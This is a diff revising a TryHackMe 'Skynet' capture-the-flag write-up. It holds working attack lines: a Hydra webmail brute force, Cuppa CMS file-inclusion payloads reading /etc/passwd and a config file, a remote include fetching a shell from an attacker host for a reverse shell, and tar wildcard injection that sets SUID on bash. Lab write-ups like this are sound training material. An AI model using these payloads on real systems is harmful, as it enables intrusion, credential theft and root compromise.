@@ -1,22 +1,17 @@
-<table>
-  <tr>
-    <td>
-      <img src="./images/unnamed.jpg" width="300">
-    </td>
-    <td width="800">
-      <h1>Skynet — Write-up</h1>
-      <p>Deploy and compromise the target machine to retrieve the user and root flags.</p>
-      <p><strong>Difficulty:</strong> Easy 🟢</p>
-      <img src="https://img.shields.io/badge/Platform-TryHackMe-blue?style=flat-square"> &nbsp;
-      <img src="https://img.shields.io/badge/Level-Easy-green?style=flat-square"> &nbsp;
-      <img src="https://img.shields.io/badge/Category-Web-green?style=flat-square">
-    </td>
-  </tr>
-</table>
+# Skynet — Write-up
+
+Deploy and compromise the target machine to retrieve the user and root flags.
+
+**Difficulty:** Easy 🟢  
+**Platform:** TryHackMe · **Level:** Easy · **Category:** Web
 
 > **Description:** A vulnerable Terminator-themed Linux machine.
 
-## 🎯 Mission Objectives
+## Executive Summary
+
+Initial access was achieved via **anonymous SMB enumeration**, which exposed a **password wordlist**. That wordlist was used to perform a credential attack against **SquirrelMail**, granting access to **milesdyson**'s mailbox and yielding additional credentials for the **milesdyson SMB share**. Inside the share, a note revealed a **hidden CMS directory**. The CMS (Cuppa CMS) was then tested and confirmed vulnerable to **Local File Inclusion (LFI) / Arbitrary File Read** via the `urlConfig` parameter, allowing retrieval of `Configuration.php` (including credentials and secrets). Code execution was obtained by including remotely hosted content through the same parameter (conditional on PHP/environment settings), resulting in a `www-data` shell. Privilege escalation was achieved through a **root cron job** running `tar` with a wildcard, exploited via `--checkpoint-action` option injection, resulting in a root shell and final flag access.
+
+## Mission Objectives
 
 In this laboratory, the following questions must be answered:
 
@@ -29,7 +24,10 @@ In this laboratory, the following questions must be answered:
 ```bash
 export TARGET_IP=<tryhackme_machine_ip>
 ```
-## 🔍 Enumeration
+
+---
+
+## Enumeration
 
 ### Nmap Scan Results
 
@@ -52,19 +50,17 @@ PORT    STATE SERVICE     VERSION
 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 
 Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
 ```
 
 ### Potential Entry Points
 
-The presence of SMB and email-related services (POP3/IMAP) suggests a common attack pattern for this machine.
-As an initial approach, SMB shares should be enumerated to determine whether anonymous or guest access is enabled.
+The presence of SMB and email-related services (POP3/IMAP) suggests a common attack pattern for this machine. As an initial approach, SMB shares should be enumerated to determine whether anonymous or guest access is enabled.
 
-## 📂 SMB Enumeration
+---
 
-### Investigating the Anonymous Share
+## SMB Enumeration
 
-Since an **anonymous SMB share** is available, the next logical step is to enumerate it and inspect its contents.
+### Listing SMB Shares
 
 ```bash
 smbclient -L //$TARGET_IP/
@@ -89,8 +85,9 @@ WORKGROUP            SKYNET
 ```
 
 #### Findings
-* anonymous: An SMB share explicitly labeled as Skynet Anonymous Share. This is highly likely to contain useful information.
-* milesdyson: A personal share belonging to Miles Dyson. Access will likely require valid credentials.
+
+- `anonymous`: An SMB share explicitly labeled as an anonymous share. This is likely to contain useful information.
+- `milesdyson`: A personal share belonging to Miles Dyson; access likely requires valid credentials.
 
 ### Accessing the Anonymous Share
 
@@ -109,8 +106,9 @@ logs                                D        0  Wed Sep 18 01:42:16 2019
 9204224 blocks of size 1024. 5831484 blocks available
 ```
 
+Downloading the files:
+
 ```bash
-Downloading Files
 smb: \> get attention.txt
 
 smb: \> cd logs\
@@ -123,7 +121,7 @@ log3.txt                            N        0  Wed Sep 18 01:42:16 2019
 smb: \logs\> get log1.txt
 ```
 
-#### File Content Analysis
+#### File Content
 
 > attention.txt
 ```text
@@ -132,6 +130,7 @@ All skynet employees are required to change their password after seeing this.
 
 -Miles Dyson
 ```
+
 > log1.txt
 ```text
 cyborg007haloterminator
@@ -166,21 +165,24 @@ Walterminator
 79terminator6
 1996terminator
 ```
-#### Analysis Summary
-* attention.txt contains a notice from Miles Dyson indicating that employee passwords were recently changed.
-* log1.txt appears to be a password wordlist, likely related to the password changes mentioned in the note.
-* This wordlist may be useful for credential attacks against email services or SMB authentication.
 
-## 🌐 Web Enumeration
+#### Analysis
+
+- `attention.txt` indicates employee passwords were recently changed.
+- `log1.txt` appears to be a password wordlist related to those changes.
+- This wordlist is suitable for credential testing against webmail and other exposed services.
+
+---
+
+## Web Enumeration
 
 ### Directory Brute-Forcing (Gobuster)
 
-To identify hidden directories and web applications, a directory brute-force scan was performed against the web server.
+To identify hidden directories and web applications, directory brute forcing was performed against the web server.
 
 ```bash
 gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt
-text
-Copiar código
+
 ===============================================================
 Gobuster v3.8
 ===============================================================
@@ -208,24 +210,19 @@ Starting gobuster in directory enumeration mode
 Finished
 ===============================================================
 ```
+
 #### Key Findings
 
-* /squirrelmail: A web-based email client (SquirrelMail), confirming the presence of an accessible webmail login interface.
-* /admin and /config: Standard directories that may contain sensitive information, although access appears to be restricted or redirected.
+- `/squirrelmail`: A web-based email client (SquirrelMail), confirming an exposed webmail login interface.
+- `/admin` and `/config`: Standard directories; not used as the primary path in this engagement.
 
-> The presence of SquirrelMail aligns with the POP3/IMAP services discovered during Nmap enumeration.
+---
 
-### Next Steps
+## Credential Attack — SquirrelMail
 
-Given the discovery of a webmail interface and the previously obtained password wordlist, the next step is to attempt credential-based attacks against the SquirrelMail login portal.
+### Brute-Forcing Webmail Credentials (Hydra)
 
-# SquirrelMail Login Interface
-
-## 🔐 Credential Attack — SquirrelMail
-
-### Brute-Forcing Webmail Credentials
-
-Based on the discovered username (**milesdyson**) and the password wordlist obtained from the SMB share, a credential attack was performed against the SquirrelMail login endpoint using **Hydra**.
+Using the username `milesdyson` and the wordlist obtained from SMB, a credential attack was performed against the SquirrelMail login endpoint:
 
 ```bash
 hydra -l milesdyson -P log1.txt $TARGET_IP http-post-form \
@@ -240,39 +237,38 @@ Hydra v9.6 (c) 2023 by van Hauser/THC
 Hydra finished at 2025-12-27 18:22:14
 ```
 
-Valid Credentials Discovered
+#### Valid Credentials Discovered
 
-> Username: milesdyson
-
-> Password: cyborg007haloterminator
+- Username: `milesdyson`
+- Password: `cyborg007haloterminator`
 
 ### Accessing the Webmail Interface
 
-With valid credentials obtained, authentication to the SquirrelMail webmail interface is now possible via the following URL:
-
 ```text
-http://10.64.185.128/squirrelmail/src/webmail.php
+http://<TARGET_IP>/squirrelmail/src/webmail.php
 ```
 
-## 📧 Email Enumeration — SquirrelMail
+---
 
-After successfully authenticating to the SquirrelMail interface, access to Miles Dyson’s mailbox is obtained.
+## Email Enumeration — SquirrelMail
 
-### Inbox Overview
+After successfully authenticating to SquirrelMail, access to Miles Dyson’s mailbox was obtained.
 
-The following image shows the **SquirrelMail inbox page**, confirming successful authentication.
+### Inbox Evidence
 
 <img src="./images/image-1.png" alt="SquirrelMail inbox view" width="1200">
 
-### Email Content Analysis
-
-One of the emails contains **sensitive information**, including credentials related to SMB access.
+### Email Evidence (SMB credentials)
 
 <img src="./images/image-2.png" alt="Email revealing SMB password" width="1200">
 
-## 📂 SMB Enumeration — Miles Dyson Share
+> Note: The screenshots above document the mailbox access and the message containing SMB-related credentials used in the next step.
 
-Using the credentials obtained from the email, authenticated access to Miles Dyson’s personal SMB share is now possible.
+---
+
+## SMB Enumeration — Miles Dyson Share
+
+Using the credentials obtained from the email, authenticated access to Miles Dyson’s personal SMB share was possible.
 
 ```bash
 smbclient -U milesdyson //$TARGET_IP/milesdyson
@@ -285,7 +281,8 @@ Neural Networks and Deep Learning.pdf
 Structuring your Machine Learning Project.pdf
 notes/
 ```
-Exploring the notes Directory
+
+Exploring the `notes/` directory:
 
 ```bash
 smb: \> cd notes
@@ -302,19 +299,23 @@ cat important.txt
 3. Spend more time with my wife
 ```
 
+---
+
 ## Hidden Web Directory Discovered
 
-The file reveals a hidden CMS directory, likely intended for internal or development use.
+The file reveals a hidden CMS directory:
 
+```text
+http://<TARGET_IP>/45kra24zxs28v3yd/
+```
 
-http://10.64.185.128/45kra24zxs28v3yd/
 <img src="./images/image-3.png" alt="Hidden CMS directory" width="1200">
 
-## 🌐 CMS Enumeration
+---
+
+## CMS Enumeration
 
 ### Directory Enumeration — Hidden CMS
-
-After discovering the hidden CMS directory, further directory enumeration was performed to identify administrative endpoints.
 
 ```bash
 gobuster dir -u http://$TARGET_IP/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt
@@ -336,73 +337,63 @@ Starting gobuster in directory enumeration mode
 Finished
 ===============================================================
 ```
-## Administrator Panel Identified
 
-The scan reveals an administrator login panel, indicating the presence of a web-based CMS administration interface.
+### Administrator Panel Identified
 
-http://10.64.185.128/45kra24zxs28v3yd/administrator/
+```text
+http://<TARGET_IP>/45kra24zxs28v3yd/administrator/
+```
+
 <img src="./images/image-4.png" alt="CMS administrator login page" width="1000">
 
+---
 
-## 🧨 Vulnerability Identification — Cuppa CMS
+## Vulnerability Identification — Cuppa CMS
 
-The administrator panel indicates that the application is running **Cuppa CMS**.  
-A quick vulnerability search reveals a known **Local/Remote File Inclusion (LFI/RFI)** vulnerability affecting this CMS.
-
-This vulnerability allows arbitrary file inclusion via user-controlled input, potentially leading to full server compromise.
+The administrator panel indicates the application is running **Cuppa CMS**.
 
 <details>
-<summary><strong>🔍 Exploit discovery (searchsploit)</strong></summary>
+<summary><strong>Exploit discovery (searchsploit)</strong></summary>
 
 ```bash
 searchsploit cuppa cms
 ```
+
 ```bash
 searchsploit -m php/webapps/25971.txt
-
 ```
+
 </details>
 
-## Local File Inclusion (LFI)
+---
 
-During the analysis of the Cuppa CMS administrator panel, a Local File Inclusion (LFI) vulnerability was identified in the file alertConfigField.php. The application dynamically includes server-side files based on the user-controlled parameter urlConfig without proper validation or sanitization.
+## Local File Inclusion (LFI) / Arbitrary File Read
 
-This behavior allows arbitrary local files to be included and rendered by the PHP interpreter. To confirm the vulnerability, the system file /etc/passwd was requested using an absolute path, which successfully returned its contents:
+An LFI / arbitrary file read issue was identified in `alertConfigField.php`, where the application includes server-side files based on the user-controlled `urlConfig` parameter without sufficient validation.
 
-http://TARGET/administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd
+### Proof of Concept — Local File Read (`/etc/passwd`)
+
+```text
+http://<TARGET_IP>/administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd
+```
+
 <img src="./images/Captura de tela_2025-12-28_10-17-28.png" alt="/etc/passwd" width="1200">
 
+### Proof of Concept — Safe Read via `php://filter`
 
-The successful disclosure of /etc/passwd confirms that the backend uses an insecure include() operation and accepts absolute file paths, proving full read access to local files on the server.
+```text
+http://<TARGET_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+```
 
-🧪 Proof of Concept — Arbitrary File Read
-
-To confirm the vulnerability, the php://filter wrapper was used to safely read and encode a PHP file in Base64, avoiding direct execution.
-
-Payload used:
-
-http://10.66.167.158/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
 <img src="./images/configphp.png" alt="config.php" width="1200">
 
+Decoded content (as obtained):
 
-The request successfully returned a Base64-encoded response, confirming that arbitrary local files can be read via the urlConfig parameter.
-
-📌 Observations
-
-The parameter name is case-sensitive: only urlConfig is processed by the application.<br>
-The vulnerability allows reading sensitive files from the server.<br>
-This confirms the presence of a Local File Inclusion (LFI) vulnerability in the Cuppa CMS installation.<br>
-
-
-
-The decoded content revealed sensitive configuration details, including database credentials and application secrets:
 ```bash
 echo "PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo/Pg==" | base64 -d
 ```
 
 ```php
-Decode text:
-
 <?php 
         class Configuration{
                 public $host = "localhost";
@@ -422,69 +413,59 @@ Decode text:
         } 
 ?>
 ```
-## 📌 Impact
 
-- Full disclosure of database credentials (`root:password123`)
-  
-  > **Note:**  
-  > The retrieved `Configuration.php` file exposed database connection parameters, including the database name, host, and credentials. The presence of standard MySQL connection fields confirms that these credentials belong to the database user rather than a system or CMS account.
+### Impact
 
-- Exposure of an application security token
-- Identification of the file upload directory, which may be leveraged for further attacks
-- Confirmation that sensitive backend configuration files are readable due to improper input handling
+- Disclosure of database credentials (`root:password123`)
+- Exposure of an application token
+- Identification of the upload directory (`media/uploadsFiles`)
+- Confirmation that sensitive backend files are readable due to insufficient input handling
 
-This significantly increases the attack surface and enables lateral movement, including database access and potential remote code execution.
+---
 
-# Exploitation — Remote File Inclusion (RFI) to Remote Code Execution (RCE)
+## Exploitation — Remote Include Leading to Code Execution (Environment-Dependent)
 
+This step uses remote inclusion through the same vulnerable parameter to execute a hosted PHP payload. Whether this works depends on PHP/environment configuration; in this lab it resulted in code execution.
 
-### 1 - Preparation & Listener Setup
-  
-First, host the PHP reverse shell script and start a netcat listener to catch the connection.
+### 1) Preparation & Listener Setup
 
-#### Host the payload:
+Host the payload:
 
 ```bash
-# Start a Python HTTP server to serve the shell.txt (PHP code)
 python3 -m http.server 8000
 ```
-#### Start the Listener:
+
+Start the listener:
 
 ```bash
-# Open netcat to listen for the incoming reverse shell
 nc -lvnp 1234
 ```
-### 2 - Execution Phase
 
-Inject the payload by passing the attacker's URL to the vulnerable parameter.
+### 2) Execution
 
-#### Payload URL: 
+```text
+http://<TARGET_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<ATTACKER_IP>:8000/shell.txt
+```
 
-> http://<target_ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker_ip>:8000/shell.txt
+### 3) Shell Stabilization
 
-### 3 - Post-Exploitation & Shell Stabilization
-
-Once the connection is established, the shell is limited. We stabilize it using Python for a fully interactive TTY.
-
-#### Establishing TTY:
 ```bash
-# Verify environment and upgrade to interactive bash
-/$ python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@skynet:/$ cd /home/milesdyson
 www-data@skynet:/home/milesdyson$ ls
 backups  mail  share  user.txt
 www-data@skynet:/home/milesdyson$ cat user.txt
 FLAG = [REDACTED]
 ```
----
 
 ---
 
-# 🪜 Privilege Escalation:
+## Privilege Escalation
 
-After gaining initial access as www-data, the next step is to look for misconfigurations or scheduled tasks that run with higher privileges. A common place to find these is the system-wide crontab.
+After obtaining a `www-data` shell, cron jobs were checked for privileged scheduled tasks.
 
-#### Checking Scheduled Tasks (Cron Jobs)
+### Checking Scheduled Tasks (Cron Jobs)
+
 ```bash
 cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -503,33 +484,33 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 ```
-#### Inspecting File Permissions
+
+### Inspecting the Script and Permissions
+
 ```bash
 www-data@skynet:/home/milesdyson/backups$ ls -la
-ls -la
 total 4584
 drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
 drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
 -rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
 -rw-r--r-- 1 root       root       4679680 Dec 28 10:06 backup.tgz
 ```
-#### 📌 As the www-data user, we cannot modify the backup.sh script directly because we lack write permissions (-rwxr-xr-x). To escalate privileges, we must find a vulnerability within the commands executed by the script itself.
 
-#### Analyzing Script Logic
+Script content:
+
 ```bash
 www-data@skynet:/home/milesdyson/backups$ cat backup.sh
-cat backup.sh
 #!/bin/bash
 cd /var/www/html
 tar cf /home/milesdyson/backups/backup.tgz *
 ```
-The script uses a wildcard (*) with the tar command. Since the shell expands the asterisk into a list of filenames, we can inject command-line arguments by creating files with specific names.
 
-#### 📂 Directory Permissions Analysis
-The directory is owned by www-data. This confirms that we have the necessary permissions to create the malicious files
+**Why this is exploitable:** `tar` will parse arguments that begin with `--` as options. Since `*` is expanded by the shell into file names in `/var/www/html`, creating files with names that look like `tar` options allows option injection when the cron job runs as root.
+
+### Confirming Write Access to the Target Directory
+
 ```bash
 www-data@skynet:/var/www/html$ ls -la
-ls -la
 total 68
 drwxr-xr-x 8 www-data www-data  4096 Nov 26  2020 .
 drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
@@ -542,42 +523,68 @@ drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
 -rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
 drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
 -rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-
 ```
-#### Create the payload
+
+### Payload Creation
+
 ```bash
 www-data@skynet:/var/www/html$ echo "chmod +s /bin/bash" > exploit.sh
 ```
-#### Create the malicious flags
+
+### Creating Malicious Filenames (tar option injection)
+
 ```bash
 www-data@skynet:/var/www/html$ touch ./"--checkpoint=1"
-touch ./"--checkpoint=1"
 ```
+
 ```bash
 www-data@skynet:/var/www/html$ touch ./"--checkpoint-action=exec=sh exploit.sh"
-touch ./"--checkpoint-action=exec=sh exploit.sh"
 ```
+
 ### Gaining Root Access
 
-After waiting one minute for the cron job to execute, I checked the permissions of the Bash binary. The SUID bit was successfully applied:
+After the cron job executed, `/bin/bash` had the SUID bit set:
+
 ```bash
 www-data@skynet:/var/www/html$ ls -la /bin/bash
-ls -la /bin/bash
 -rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
 ```
-I then executed Bash with the -p flag to drop into a root shell:
+
+Root shell:
 
 ```bash
 www-data@skynet:/var/www/html$ /bin/bash -p
-/bin/bash -p
-bash-4.3# 
+bash-4.3#
 ```
-### Final Flag
-Finally, I navigated to the root directory and retrieved the flag:
+
+Final flag:
+
 ```bash
 cat /root/root.txt
 # Flag: [REDACTED]
 ```
 
-> ## PWNED! 🚩
-> ### By Hirt, Nelson
+---
+
+## Answers
+
+- **What is Miles' email password?** `cyborg007haloterminator`
+- **What is the hidden directory?** `/45kra24zxs28v3yd/`
+- **What is the vulnerability called when a remote file can be included for malicious purposes?** Remote File Inclusion (RFI) *(general term; the confirmed issue demonstrated here is LFI/Arbitrary File Read, and remote inclusion worked in this lab environment)*
+- **User Flag:** `THM{...}` *(redacted)*
+- **Root Flag:** `THM{...}` *(redacted)*
+
+---
+
+## Hardening Notes (Brief)
+
+- Disable or restrict **anonymous SMB** and enforce least-privilege share permissions.
+- Reduce exposed services (webmail) and avoid storing credentials in email content.
+- Patch/replace vulnerable CMS components and validate any file include functionality.
+- Review PHP configuration that enables URL-based includes (where applicable).
+- Avoid privileged cron jobs that run `tar ... *` over attacker-writable directories; use controlled file lists and safe argument handling.
+- Audit file permissions for web roots and other directories writable by service accounts.
+
+---
+
+Written by Nelson Hirt
